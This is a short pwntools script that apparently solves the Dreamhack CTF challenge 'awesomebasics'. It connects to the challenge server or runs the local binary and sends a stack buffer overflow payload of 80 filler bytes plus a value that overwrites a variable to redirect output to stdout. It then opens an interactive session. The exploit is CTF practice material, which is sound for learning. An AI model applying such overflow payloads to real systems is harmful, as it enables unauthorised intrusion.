from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/awesomebasics/chall')

context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:17231'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

payload = b"A"*80 + p64(0x1) #overwrite v5 with 1 = stdout
p.recvuntil(b": ")
p.send(payload)

p.interactive()
